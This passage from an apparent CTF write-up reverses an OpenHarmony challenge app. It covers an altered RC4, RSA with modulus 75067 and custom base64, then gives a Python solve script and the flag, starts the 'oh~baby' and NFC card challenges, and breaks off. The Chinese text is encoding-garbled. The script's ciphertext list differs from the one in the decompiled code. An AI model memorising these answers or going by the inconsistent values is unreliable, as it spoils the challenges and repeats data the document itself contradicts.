= <span class="hljs-built_in">this</span>.stringToUint8Array;<br>        ldobjbyvalue = rsaEncrypt[i];<br>        objArr[i] = obj(obj2(ldobjbyvalue.toString()));<br>    &#125;<br>    <span class="hljs-keyword">return</span> objArr;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å¯ä»¥ä»ä¸­æå–åˆ°å¯†æ–‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>=#Index(Object functionObject, Object newTarget, Index <span class="hljs-built_in">this</span>, Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) &#123;<br>    obj = arg3;<br>    obj2 = arg4;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-number">0</span> == obj ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;<br>        obj = -<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-number">0</span> == obj2 ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;<br>        obj2 = <span class="hljs-literal">null</span>;<br>    &#125;<br>    obj3 = <span class="hljs-built_in">super</span>(arg0, arg2, obj, arg5);<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-string">&quot;function&quot;</span> == typeof(obj2) ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;<br>        obj3.paramsGenerator_ = obj2;<br>    &#125;<br>    obj3.__inputText = ObservedPropertySimplePU(<span class="hljs-string">&quot;&quot;</span>, obj3, <span class="hljs-string">&quot;inputText&quot;</span>);<br>    obj3.__isDialogShow = ObservedPropertySimplePU(<span class="hljs-literal">null</span>, obj3, <span class="hljs-string">&quot;isDialogShow&quot;</span>);<br>    obj3.__dialogMessage = ObservedPropertySimplePU(<span class="hljs-string">&quot;&quot;</span>, obj3, <span class="hljs-string">&quot;dialogMessage&quot;</span>);<br>    obj3.targetCipher = createarraywithbuffer([<span class="hljs-string">&quot;ndG5nZa=&quot;</span>, <span class="hljs-string">&quot;nte3ndK=&quot;</span>, <span class="hljs-string">&quot;nJy2nJi=&quot;</span>, <span class="hljs-string">&quot;mtK0mJG=&quot;</span>, <span class="hljs-string">&quot;nde5mZK=&quot;</span>, <span class="hljs-string">&quot;mJK5nJK=&quot;</span>, <span class="hljs-string">&quot;ntaXnJu=&quot;</span>, <span class="hljs-string">&quot;ndG5nZa=&quot;</span>, <span class="hljs-string">&quot;mZC4mtC=&quot;</span>, <span class="hljs-string">&quot;nZa5mZe=&quot;</span>, <span class="hljs-string">&quot;nJC1nZi=&quot;</span>, <span class="hljs-string">&quot;mJK0ntq=&quot;</span>, <span class="hljs-string">&quot;mta4nta=&quot;</span>, <span class="hljs-string">&quot;mZm5nW==&quot;</span>, <span class="hljs-string">&quot;mZG0mJq=&quot;</span>, <span class="hljs-string">&quot;ntCZnZi=&quot;</span>, <span class="hljs-string">&quot;nJyYmJe=&quot;</span>, <span class="hljs-string">&quot;mJy5ntq=&quot;</span>, <span class="hljs-string">&quot;mtK0nJa=&quot;</span>, <span class="hljs-string">&quot;ndK2nJm=&quot;</span>, <span class="hljs-string">&quot;ndyXmJe=&quot;</span>, <span class="hljs-string">&quot;ntmWnZi=&quot;</span>, <span class="hljs-string">&quot;mJK5nJK=&quot;</span>, <span class="hljs-string">&quot;nZe0nq==&quot;</span>, <span class="hljs-string">&quot;ndaZmJu=&quot;</span>, <span class="hljs-string">&quot;ndqXndm=&quot;</span>, <span class="hljs-string">&quot;mtiWnda=&quot;</span>, <span class="hljs-string">&quot;nJy2nJi=&quot;</span>, <span class="hljs-string">&quot;ndqXndm=&quot;</span>, <span class="hljs-string">&quot;mtyZodq=&quot;</span>, <span class="hljs-string">&quot;mtK0mJG=&quot;</span>, <span class="hljs-string">&quot;ndy5ndu=&quot;</span>, <span class="hljs-string">&quot;ndiZndC=&quot;</span>, <span class="hljs-string">&quot;mZK3mJe=&quot;</span>, <span class="hljs-string">&quot;ndmYmZG=&quot;</span>, <span class="hljs-string">&quot;mJi0nte=&quot;</span>, <span class="hljs-string">&quot;ndK2nJm=&quot;</span>, <span class="hljs-string">&quot;mtK0nJa=&quot;</span>]);<br>    obj3.secretKey = <span class="hljs-string">&quot;OHCTF2025&quot;</span>;<br>    obj3.__isInitialized = ObservedPropertySimplePU(<span class="hljs-literal">null</span>, obj3, <span class="hljs-string">&quot;isInitialized&quot;</span>);<br>    obj3.setInitiallyProvidedValue(arg1);<br>    obj3.finalizeConstruction();<br>    <span class="hljs-keyword">return</span> obj3;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>key ä¸º <code>OHCTF2026</code>ï¼Œå°† <code>OHCTF2025</code> è¦†ç›–äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>&gt;#onPageShow(Object functionObject, Object newTarget, Index <span class="hljs-built_in">this</span>) &#123;<br>    <span class="hljs-keyword">if</span> (isfalse(istrue(<span class="hljs-built_in">this</span>.isInitialized) == <span class="hljs-literal">null</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-built_in">this</span>.secretKey = <span class="hljs-string">&quot;OHCTF2026&quot;</span>;<br>    <span class="hljs-built_in">this</span>.isInitialized = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>rc 4 çš„ s ç›’è¿›è¡Œäº†é­”æ”¹ï¼Œå¯¹ keystream è¿›è¡Œäº†ç›¸åŠ è€Œä¸æ˜¯å¼‚æˆ–</p><p>rsa åŠ å¯†ä¸­ mod 75067ï¼ŒæŒ‡æ•°ä¸º 7</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>&gt;#rc4Encrypt(Object functionObject, Object newTarget, Index <span class="hljs-built_in">this</span>, Object arg0, Object arg1) &#123;<br>    objArr = [Object];<br>    i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i2 = <span class="hljs-number">0</span>; (i2 &lt; <span class="hljs-number">256</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>; i2 = tonumer(i2) + <span class="hljs-number">1</span>) &#123;<br>        objArr.push(i2);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i3 = <span class="hljs-number">0</span>; (i3 &lt; <span class="hljs-number">256</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>; i3 = tonumer(i3) + <span class="hljs-number">1</span>) &#123;<br>        i = ((i + objArr[i]) + arg0.charCodeAt(i % arg0.length)) % <span class="hljs-number">256</span>;<br>        ldobjbyvalue = objArr[i3];<br>        objArr[i3] = objArr[i];<br>        objArr[i] = ldobjbyvalue;<br>    &#125;<br>    i4 = <span class="hljs-number">0</span>;<br>    i5 = <span class="hljs-number">0</span>;<br>    newobjrange = Uint8Array(arg1.length);<br>    <span class="hljs-keyword">for</span> (i6 = <span class="hljs-number">0</span>; (i6 &lt; arg1.length ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>; i6 = tonumer(i6) + <span class="hljs-number">1</span>) &#123;<br>        i4 = (i4 + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        i5 = (i5 + objArr[i4]) % <span class="hljs-number">256</span>;<br>        ldobjbyvalue2 = objArr[i4];<br>        objArr[i4] = objArr[i5];<br>        objArr[i5] = ldobjbyvalue2;<br>        newobjrange[i6] = (arg1.charCodeAt(i6) + objArr[(objArr[i4] + objArr[i5]) % <span class="hljs-number">256</span>]) % <span class="hljs-number">256</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> newobjrange;<br>&#125;<br><br><span class="hljs-comment">/* JADX WARN: Type inference failed for: r21v25, types: [int] */</span><br><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>&gt;#rsaEncrypt(Object functionObject, Object newTarget, Index <span class="hljs-built_in">this</span>, Object arg0) &#123;<br>    objArr = [Object];<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; (i &lt; arg0.length ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>; i = tonumer(i) + <span class="hljs-number">1</span>) &#123;<br>        objArr[i] = <span class="hljs-built_in">this</span>.modPow(arg0[i], <span class="hljs-number">7</span>, <span class="hljs-number">75067</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> objArr;<br>&#125;<br><br><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>&gt;#customBase64(Object functionObject, Object newTarget, Index <span class="hljs-built_in">this</span>, Object arg0) &#123;<br>    newobjrange = <span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">default</span> as util &#125; from <span class="hljs-string">&quot;@ohos:util&quot;</span>.Base64Helper();<br>    encodeToStringSync = newobjrange.encodeToStringSync(arg0);<br>    from = Array.from(<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&quot;</span>);<br>    obj = <span class="hljs-string">&quot;&quot;</span>;<br>    obj2 = getiterator(encodeToStringSync);<br>    obj3 = obj2.next;<br>    i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        callthisN = obj3();<br>        throw.ifnotobject(callthisN);<br>        <span class="hljs-keyword">if</span> (istrue(callthisN.done) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>        r27 = callthisN.value;<br>        <span class="hljs-keyword">try</span> &#123;<br>            indexOf = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>.indexOf(r27);<br>            r27 = ((-<span class="hljs-number">1</span>) != indexOf ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);<br>            obj = (obj == <span class="hljs-literal">true</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) + (r27 != <span class="hljs-number">0</span> ? from[indexOf] : <span class="hljs-string">&quot;=&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ExceptionI0 unused) &#123;<br>            z = r27;<br>            <span class="hljs-keyword">if</span> (istrue(i) == <span class="hljs-literal">null</span>) &#123;<br>                i = <span class="hljs-number">1</span>;<br>                obj4 = <span class="hljs-literal">null</span>;<br>                r272 = hole;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    obj5 = obj2.return;<br>                    obj3 = obj5;<br>                    r272 = (<span class="hljs-number">0</span> == obj5 ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (ExceptionI0 unused2) &#123;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (r272 == <span class="hljs-number">0</span>) &#123;<br>                    obj4 = obj3();<br>                    <span class="hljs-keyword">throw</span>(z);<br>                    throw.ifnotobject(obj4);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">throw</span>(z);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å› æ­¤åŠ å¯†æµç¨‹ä¸ºï¼šenc -&gt; rc4  -&gt; æ¯ä¸ªå…ƒç´  rsa -&gt; å¯¹æ¯ä¸ªç»“æœ toString -&gt; stringToUint8Array() -&gt; base64 encode</p><p>å¯ä»¥å†™å‡ºé€†å‘è„šæœ¬ï¼šbase64 -&gt;  rsa -&gt; rc4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><br>STANDARD_TABLE = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">base64_decode_change_table</span>(<span class="hljs-params">c, new_table</span>):<br>    new_c = [STANDARD_TABLE[new_table.index(ch)] <span class="hljs-keyword">if</span> ch != <span class="hljs-string">&#x27;=&#x27;</span> <span class="hljs-keyword">else</span> ch <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> c]<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> base64.b64decode(<span class="hljs-string">&#x27;&#x27;</span>.join(new_c)).decode()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> base64.b64decode(<span class="hljs-string">&#x27;&#x27;</span>.join(new_c))<br><br><br>s = [<span class="hljs-string">&quot;ndG5nZa=&quot;</span>, <span class="hljs-string">&quot;nte3ndK=&quot;</span>, <span class="hljs-string">&quot;nJy2nJi=&quot;</span>, <span class="hljs-string">&quot;mtK0mJG=&quot;</span>, <span class="hljs-string">&quot;nde5mZK=&quot;</span>, <span class="hljs-string">&quot;odqXmG==&quot;</span>, <span class="hljs-string">&quot;nJa1mJK=&quot;</span>, <span class="hljs-string">&quot;nZe0nq==&quot;</span>, <span class="hljs-string">&quot;ntK0nda=&quot;</span>,<br>     <span class="hljs-string">&quot;mJK5nJK=&quot;</span>, <span class="hljs-string">&quot;nJiYndG=&quot;</span>, <span class="hljs-string">&quot;mZyYndC=&quot;</span>, <span class="hljs-string">&quot;nJy5&quot;</span>, <span class="hljs-string">&quot;mJqWodC=&quot;</span>, <span class="hljs-string">&quot;nZe4nJK=&quot;</span>, <span class="hljs-string">&quot;nJiXnJG=&quot;</span>, <span class="hljs-string">&quot;ndK2nJm=&quot;</span>, <span class="hljs-string">&quot;nJC3odu=&quot;</span>, <span class="hljs-string">&quot;mtiWnda=&quot;</span>,<br>     <span class="hljs-string">&quot;ndK2nJm=&quot;</span>, <span class="hljs-string">&quot;nte4ma==&quot;</span>, <span class="hljs-string">&quot;ntuYodC=&quot;</span>, <span class="hljs-string">&quot;ndq0odK=&quot;</span>, <span class="hljs-string">&quot;nJiYndG=&quot;</span>, <span class="hljs-string">&quot;mJaYnZK=&quot;</span>, <span class="hljs-string">&quot;nJaZmq==&quot;</span>, <span class="hljs-string">&quot;mJK2ndu=&quot;</span>, <span class="hljs-string">&quot;mta5oti=&quot;</span>,<br>     <span class="hljs-string">&quot;mJu3ntC=&quot;</span>, <span class="hljs-string">&quot;nZaZndm=&quot;</span>, <span class="hljs-string">&quot;mJeXodi=&quot;</span>, <span class="hljs-string">&quot;mtGXmti=&quot;</span>, <span class="hljs-string">&quot;mtqZnW==&quot;</span>, <span class="hljs-string">&quot;ndm1nW==&quot;</span>, <span class="hljs-string">&quot;nJm3ody=&quot;</span>, <span class="hljs-string">&quot;odG4na==&quot;</span>, <span class="hljs-string">&quot;nJy5&quot;</span>, <span class="hljs-string">&quot;mtK0nJa=&quot;</span>]<br><br>target = [<span class="hljs-built_in">int</span>(base64_decode_change_table(i, <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&quot;</span>)) <span class="hljs-keyword">for</span> i<br>          <span class="hljs-keyword">in</span> s]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mod_pow</span>(<span class="hljs-params">base, exp, mod</span>):<br>    result = <span class="hljs-number">1</span><br>    base %= mod<br>    <span class="hljs-keyword">while</span> exp:<br>        <span class="hljs-keyword">if</span> exp &amp; <span class="hljs-number">1</span>:<br>            result = (result * base) % mod<br>        base = (base * base) % mod<br>        exp &gt;&gt;= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rsa_decrypt_array</span>(<span class="hljs-params">cipher_arr</span>):<br>    n = <span class="hljs-number">75067</span><br>    phi = <span class="hljs-number">270</span> * <span class="hljs-number">276</span><br>    d = invert(<span class="hljs-number">7</span>, phi)<br>    <span class="hljs-keyword">return</span> [mod_pow(c, d, n) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cipher_arr]<br><br><br>plaintext_bytes = rsa_decrypt_array(target)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KSA</span>(<span class="hljs-params">key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[j] + key[j % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>    <span class="hljs-keyword">return</span> S<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">PRGA</span>(<span class="hljs-params">S</span>):<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        <span class="hljs-keyword">yield</span> S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">RC4</span>(<span class="hljs-params">key, text</span>):<br>    S = KSA(key)<br>    keystream = PRGA(S)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>((char - <span class="hljs-built_in">next</span>(keystream)) &amp; <span class="hljs-number">0xff</span> <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> text)<br><br><br>key = <span class="hljs-string">b&quot;OHCTF2026&quot;</span><br><span class="hljs-built_in">print</span>(RC4(key, plaintext_bytes))<br><br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">43</span>c70db57b7ddb1ae6adb20f9b87ebf2&#125;<br></code></pre></td></tr></table></figure><h2 id="oh-baby"><a href="#oh-baby" class="headerlink" title="oh~baby"></a>oh~baby</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ä½ äº†è§£é¸¿è’™çš„HDFå’ŒHCSå—ï¼Ÿ<br>hcså®¢æˆ·ç«¯åœ¨<span class="hljs-regexp">/vendor/</span>ä¸‹<br></code></pre></td></tr></table></figure><p>æŠŠ sh è½¬æˆ bat è„šæœ¬å¯åŠ¨ qemuï¼Œæœ‰å›¾å½¢åŒ–ï¼Œä½†æ˜¯å…¶å®æ²¡å•¥ç”¨</p><img src="https://img.dkdun.cn/v1/2025/12/446c81d9907e7c7d.png" alt="image-20250715015358210" style="zoom: 50%;" /><p>å¯ä»¥çœ‹å‘½ä»¤è¡Œï¼Œå¤§æ¦‚äº†è§£äº†ä¸€ä¸‹æç¤ºçš„ HDF å’Œ HCS</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">HDF æ˜¯é¸¿è’™çš„é©±åŠ¨æ¡†æ¶<br><span class="hljs-built_in">HCS</span>(HDF Configuration Source)æ˜¯ HDF é©±åŠ¨æ¡†æ¶çš„é…ç½®æè¿°æºç ï¼Œå†…å®¹ä»¥ Key-Value ä¸ºä¸»è¦å½¢å¼ï¼Œå’Œjsonæ ¼å¼å·®ä¸å¤šï¼ŒHCS ä¸»è¦åˆ†ä¸ºå±æ€§(Attribute)å’ŒèŠ‚ç‚¹(Node)ä¸¤ç§ç»“æ„<br></code></pre></td></tr></table></figure><p>&#x2F;vendor&#x2F;bin æœ‰ä¸€ä¸ª chall</p><img src="https://img.dkdun.cn/v1/2025/12/ec63f31a34cd8264.png" alt="image-20250716154052180" style="zoom: 50%;" /><p>è¿è¡Œ chall åä¼šå’Œ chall_driver é©±åŠ¨äº¤äº’è¿›è¡Œ AES åŠ å¯†ï¼Œè¾“å…¥é•¿åº¦å¿…é¡»æ˜¯16çš„å€æ•°</p><p>æŠŠ chall æ–‡ä»¶æŒ‚è½½ä¸‹æ¥åˆ†æ</p><p>ç”¨ mount æŸ¥çœ‹æŒ‚è½½ç‚¹</p><img src="https://img.dkdun.cn/v1/2025/12/6d1a9a5816ccf115.png" alt="image-20250716160616345" style="zoom: 80%;" /><p>æŠŠ userdata.img æŒ‚è½½åˆ° WSL ä¸­</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift">mkdir <span class="hljs-operator">-</span>p <span class="hljs-regexp">/mnt/</span>userdata<br>sudo mount <span class="hljs-operator">-</span>o loop &#x27;<span class="hljs-regexp">/mnt/</span>f<span class="hljs-regexp">/CTF question/</span><span class="hljs-type">OpenHarmonyCTF</span><span class="hljs-regexp">/Reverse/</span>oh<span class="hljs-operator">~</span>baby<span class="hljs-regexp">/images/</span>userdata.img&#x27; <span class="hljs-regexp">/mnt/</span>userdata<br></code></pre></td></tr></table></figure><p>åœ¨ &#x2F;mnt&#x2F;userdata æ‹¿åˆ° chall</p><p><img src="https://img.dkdun.cn/v1/2025/12/45cf4b20e7ac1254.png" alt="image-20250716163939589"></p><p>main å‡½æ•°ä¸­å‘ç°ç»‘å®šçš„ chall_service</p><p>ä½†æ˜¯è¿™ä¸ªæ–‡ä»¶ä¹Ÿæ²¡å•¥ç”¨ï¼Œbinwalk çœ‹ bzImageï¼Œå‘ç°æœ‰ä¸€ä¸ªå‹ç¼©æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/fb374ec8d97930de.png" alt="image-20250715011828530"></p><p>åˆ†æè¿™ä¸ª ELF æ–‡ä»¶ï¼Œæ ¹æ®å­—ç¬¦ä¸²å®šä½åˆ°å‡½æ•°ï¼Œæ‰¾åˆ°äº†æ¯”è¾ƒçš„åœ°æ–¹</p><p><img src="https://img.dkdun.cn/v1/2025/12/8f93e4d52af99565.png" alt="image-20250716185935811"></p><p>å¯†æ–‡å€¼ä¸º <code>8BE07936ADBB8728D93BB1E0AB715353</code></p><p>æ‰¾äº†å¾ˆä¹…éƒ½æ²¡æ‰¾åˆ°åŠ å¯†å‡½æ•°ï¼Œæ”¾å¼ƒäº†ï¼Œçƒ‚å°¾äº†ã€‚ã€‚ã€‚</p><h1 id="HardWare"><a href="#HardWare" class="headerlink" title="HardWare"></a>HardWare</h1><h2 id="A-Mysterious-Card"><a href="#A-Mysterious-Card" class="headerlink" title="A Mysterious Card"></a>A Mysterious Card</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Few days ago, I found a card <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> street. I trying <span class="hljs-keyword">to</span> analysis <span class="hljs-keyword">the</span> card, <span class="hljs-keyword">but</span> failed <span class="hljs-keyword">to</span> do so.<br>Can you <span class="hljs-keyword">try</span> <span class="hljs-keyword">to</span> retrieve <span class="hljs-keyword">the</span> content <span class="hljs-keyword">for</span> <span class="hljs-keyword">me</span>? UwU<br>The content <span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span> hold <span class="hljs-keyword">the</span> <span class="hljs-built_in">word</span> flag&#123;&#125;, please add <span class="hljs-keyword">the</span> <span class="hljs-built_in">word</span> flag&#123; <span class="hljs-keyword">and</span> &#125; <span class="hljs-keyword">between</span> <span class="hljs-keyword">the</span> content you found inside <span class="hljs-keyword">the</span> card.<br></code></pre></td></tr></table></figure><p>æ˜¯ä¸€ä¸ª NFC æ–‡ä»¶</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 